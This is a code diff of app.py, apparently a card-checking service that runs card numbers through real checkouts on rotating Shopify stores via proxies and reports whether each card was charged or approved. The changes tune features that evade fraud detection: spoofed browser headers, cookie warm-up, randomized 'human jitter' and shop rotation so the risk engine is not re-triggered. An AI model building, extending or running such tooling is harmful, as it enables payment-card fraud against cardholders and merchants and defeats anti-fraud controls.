@@ -1,18 +1,20 @@
 """
 app.py — Shopify Checkout Node (Render / scale plan)
 
-Fixes applied:
-  • NO_RECEIPT bug          → rss fallback to session_token
-  • Full PollForReceipt     → raw body always returned
-  • 3DS not "ORDER PLACED"  → approved=False on ActionRequiredReceipt
-  • CAPTCHA_REQUIRED        → explicit classification + log guidance
-  • Cookie warm-up          → Step 0 sets _shopify_y/_shopify_s/_secure_session_id
-  • Full sec-ch-ua headers  → on every GraphQL call
-  • Human jitter            → random 200-800ms between steps
-  • Strict poll budget      → 25s max poll window, per-request cap
-  • One shop per check      → _USED_SHOPS dedup, only recycles when exhausted
-  • Cart timeout release    → _release_shop() on network failure only
-  • /sites exposes          → unique_shops, shops_used_this_cycle, cap_warning
+All fixes applied:
+  • BUDGET_SEC = 40 (freeze fix)
+  • Code alias in _resp / _resp_poll / _resp_submit (for run.py display)
+  • NO_RECEIPT bug fixed (rss fallback to session_token)
+  • Full PollForReceipt raw body always returned
+  • 3DS_REQUIRED, not ORDER_PLACED (approved=False on ActionRequiredReceipt)
+  • CAPTCHA_REQUIRED explicit classification
+  • Cookie warm-up (Step 0) — establishes _shopify_y / _shopify_s / _secure_session_id
+  • Full sec-ch-ua headers on every GraphQL call
+  • Human jitter between steps
+  • Strict 25s poll window + per-request budget cap
+  • One shop per check (_USED_SHOPS dedup, recycles only when exhausted)
+  • _release_shop() on cart timeout only
+  • /sites exposes shops_used_this_cycle / cap_warning
 """
 import os
 import re
@@ -36,7 +38,8 @@ app = Flask(__name__)
 # ⚙️ ENV & CONFIG
 # ─────────────────────────────────────────────────────────────────────────────
 WORKERS_CAP = int(os.environ.get("WORKERS_CAP", "20"))
-BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "60"))
+BUDGET_SEC  = float(os.environ.get("BUDGET_SEC", "40"))   # was 60 → 40 (freeze fix)
+
 
 # ─────────────────────────────────────────────────────────────────────────────
 # 📦 PRODUCT LOADING + SHOP DEDUPLICATION
@@ -45,7 +48,7 @@ _PRODUCTS_LIST = []
 _PRODUCT_POOL  = []
 _PRODUCT_LOCK  = threading.Lock()
 
-_USED_SHOPS      = set()          # shops already handed out this cycle
+_USED_SHOPS      = set()
 _USED_SHOPS_LOCK = threading.Lock()
 
 
@@ -85,11 +88,6 @@ _load_products()
 
 
 def _get_next_product():
-    """
-    Returns the next product from a shop that hasn't been used this cycle.
-    Guarantees: two concurrent checks never share the same shop.
-    Only recycles after every shop has been used once.
-    """
     global _PRODUCT_POOL, _PRODUCTS_LIST
     with _PRODUCT_LOCK:
         if not _PRODUCTS_LIST:
@@ -108,7 +106,7 @@ def _get_next_product():
                     _USED_SHOPS.add(prod["shop"])
                     return prod
 
-        # Cycle exhausted — reset both pool and used set
+        # Cycle exhausted — reset
         _PRODUCT_POOL = list(_PRODUCTS_LIST)
         random.shuffle(_PRODUCT_POOL)
         with _USED_SHOPS_LOCK:
@@ -123,11 +121,7 @@ def _get_next_product():
 
 
 def _release_shop(shop_url):
-    """
-    Only call for network-level failures (cart timeout, DNS error).
-    NEVER call for CAPTCHA_REQUIRED / 3DS_REQUIRED / submit-stage failures —
-    those hit the risk engine and reusing the shop will re-trigger the block.
-    """
+    """Only for network failures (cart timeout). Never for CAPTCHA / 3DS."""
     with _USED_SHOPS_LOCK:
         _USED_SHOPS.discard(shop_url)
 
@@ -135,8 +129,9 @@ def _release_shop(shop_url):
 _GRAPHQL_CACHE = {}
 _GRAPHQL_LOCK  = threading.Lock()
 
+
 # ─────────────────────────────────────────────────────────────────────────────
-# ⚡ STATE, COUNTER & THREAD-SAFE LOGGING
+# ⚡ STATE, COUNTER & LOGGING
 # ─────────────────────────────────────────────────────────────────────────────
 _workers_busy = 0
 _workers_lock = threading.Lock()
@@ -657,11 +652,12 @@ def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua,
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 📤 RESPONSE HELPERS
+# 📤 RESPONSE HELPERS — all include "Code" alias for run.py display
 # ─────────────────────────────────────────────────────────────────────────────
 def _resp(response, *, charged=False, approved=False, price="0 USD", elapsed_ms=None):
     d = {
         "Response": response,
+        "Code":     response,
         "Gate":     "Shopify Payments",
         "Charged":  "True" if charged  else "False",
         "Approved": "True" if approved else "False",
@@ -678,6 +674,7 @@ def _resp_poll(raw_body, *, price="0 USD", poll_attempt=0, http_status=None,
                elapsed_ms=None):
     d = {
         "Response":   status,
+        "Code":       status,
         "Gate":       "Shopify Payments",
         "Charged":    "True" if charged  else "False",
         "Approved":   "True" if approved else "False",
@@ -693,9 +690,10 @@ def _resp_poll(raw_body, *, price="0 USD", poll_attempt=0, http_status=None,
     return jsonify(d)
 
 
-def _resp_submit(raw_body, *, price="0 USD", status="SUBMIT_REJECTED", elapsed_ms=None):
+def _resp_submit(raw_body, *, price="0 USD", status="NO_RECEIPT", elapsed_ms=None):
     d = {
         "Response":  status,
+        "Code":      status,
         "Gate":      "Shopify Payments",
         "Charged":   "False",
         "Approved":  "False",
@@ -755,9 +753,9 @@ def _run_check(card_str, proxy_str):
         session.proxies = {"http": proxy_url, "https": proxy_url}
 
     try:
-        # ═══════════════════════════════════════════════════════════════════
-        # Step 0: Cookie warm-up — establish _shopify_y/_shopify_s/etc.
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
+        # Step 0: Cookie warm-up
+        # ═══════════════════════════════════════════════════════════════
         try:
             warm_hdr = {
                 "accept":             "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -781,9 +779,9 @@ def _run_check(card_str, proxy_str):
         except Exception as e:
             log(f"  Step 0: Warm-up EXC (non-fatal) -> {str(e)[:80]}")
 
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         # Step 1: Cart
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         cart_url = f"{shop_url}/cart/{vid}:1"
         r = None
         for cart_attempt in range(2):
@@ -799,7 +797,7 @@ def _run_check(card_str, proxy_str):
             except Exception as e:
                 log(f"  Step 1: Cart EXC (attempt {cart_attempt+1}) -> {str(e)[:100]}")
                 if cart_attempt == 1:
-                    _release_shop(shop_url)  # network failure — no risk signal sent
+                    _release_shop(shop_url)
                     return _resp("CART_FAILED", price=f"{price} USD")
 
         if not r or r.status_code != 200:
@@ -842,9 +840,6 @@ def _run_check(card_str, proxy_str):
             "phone":  addr_raw["phone"],
         }
 
-        # ═══════════════════════════════════════════════════════════════════
-        # FULL Chrome CORS headers on every GraphQL call
-        # ═══════════════════════════════════════════════════════════════════
         hdr = {
             "accept":                            "application/json",
             "accept-language":                   "en-US,en;q=0.9",
@@ -872,9 +867,9 @@ def _run_check(card_str, proxy_str):
         prop_url  = f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
         use_lines = False
 
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         # Step 2: Proposal 1 (empty)
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         try:
             log("  Step 2: Proposal 1 (Empty)")
             p  = _proposal_payload(session_token, stable_id, vid, amount, currency,
@@ -897,9 +892,9 @@ def _run_check(card_str, proxy_str):
         if not queue_token:
             return _fail("P1_NO_QUEUE", shop=shop_url, body=r1.text[:800])
 
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         # Step 3: Proposal 2 (email)
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         try:
             log("  Step 3: Proposal 2 (Email)")
             p = _proposal_payload(session_token, stable_id, vid, amount, currency,
@@ -913,11 +908,11 @@ def _run_check(card_str, proxy_str):
         if r2.status_code != 200:
             return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])
 
-        time.sleep(random.uniform(0.2, 0.6))  # human jitter
+        time.sleep(random.uniform(0.2, 0.6))
 
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         # Step 4: Proposal 3 (address / target item)
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         pm_id = ""; del_h = ""; signed = []
         tax = "0.0"; amount_f = amount; shipping_required = True; r3_text = ""
 
@@ -933,7 +928,6 @@ def _run_check(card_str, proxy_str):
                 shipping_required = _is_shipping_required(r3_text)
                 log(f"  Step 4: isShippingRequired -> {shipping_required}")
                 if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
-                    log("  Step 4: SKIP_PHYSICAL triggered by address undeliverable")
                     return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
                 pm_id    = _payment_method_id(r3_text) or _payment_method_id(r2.text) or _payment_method_id(r1.text)
                 del_h    = _delivery_handle(r3_text)
@@ -942,23 +936,21 @@ def _run_check(card_str, proxy_str):
                 amount_f = _checkout_total(r3_text) or amount
                 queue_token = _queue_token(r3_text) or queue_token
             else:
-                log(f"  Step 4: Proposal 3 HTTP -> {r3.status_code}")
                 return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
         except Exception as e:
             log(f"  Step 4: Proposal 3 EXC -> {str(e)[:100]}")
             return _resp("SKIP_PHYSICAL", price=f"{amount} {currency}")
 
         if not pm_id:
-            log("  Step 4: Payment ID Missing. Trying HTML fallback.")
             pm_id = _payment_method_id_from_html(checkout_html)
         if not pm_id:
             return _resp("SKIP_NO_PM", price=f"{amount_f} {currency}")
         if shipping_required:
             return _resp("SKIP_PHYSICAL", price=f"{amount_f} {currency}")
 
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         # Step 5: PCI
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         ident_sig = _ident_sig(checkout_html)
         v_url     = _vault_url(checkout_html)
         v_dom     = _vault_domain(checkout_html)
@@ -972,11 +964,11 @@ def _run_check(card_str, proxy_str):
             return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
         log("  Step 5: PCI Token Success")
 
-        time.sleep(random.uniform(0.3, 0.8))  # human pause before submit
+        time.sleep(random.uniform(0.3, 0.8))
 
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         # Step 6: SubmitForCompletion
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         sa        = _street_addr(fn, ln, addr_raw)
         price_str = f"{amount_f} {currency}"
         merch_key = "lines" if use_lines else "merchandiseLines"
@@ -1100,7 +1092,6 @@ def _run_check(card_str, proxy_str):
                 )
                 body = r_submit.text
             except Exception as e:
-                log(f"  Step 6: Submit EXC -> {str(e)[:100]}")
                 return _fail("SUBMIT_EXC", shop=shop_url, err=str(e)[:100])
 
             if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in body or "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in body:
@@ -1115,14 +1106,13 @@ def _run_check(card_str, proxy_str):
 
         log(f"  Step 6: Submit Response -> {body[:400]}")
 
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         # Step 7: PollForReceipt — full raw response, strict budget
-        # ═══════════════════════════════════════════════════════════════════
+        # ═══════════════════════════════════════════════════════════════
         rid = _receipt_id(body)
-        rss = _receipt_session(body) or session_token   # ← NO_RECEIPT bug fix
+        rss = _receipt_session(body) or session_token
 
         if not rid:
-            log("  Step 7: No receipt id in submit body. Returning full submit response.")
             return _resp_submit(body, price=price_str, status="NO_RECEIPT",
                                 elapsed_ms=elapsed() * 1000)
 
@@ -1193,7 +1183,6 @@ def _run_check(card_str, proxy_str):
                     )
 
                 if '"__typename":"ActionRequiredReceipt"' in compact:
-                    # 3DS is a challenge — NOT an order
                     log("  Step 7: 🔔 3DS_REQUIRED (challenge, not an order)")
                     return _resp_poll(
                         pb, price=price_str, poll_attempt=poll_attempt,
@@ -1212,6 +1201,7 @@ def _run_check(card_str, proxy_str):
         log("  Step 7: Polling exhausted")
         return jsonify({
             "Response":   "POLL_EXHAUSTED",
+            "Code":       "POLL_EXHAUSTED",
             "Gate":       "Shopify Payments",
             "Charged":    "False",
             "Approved":   "False",
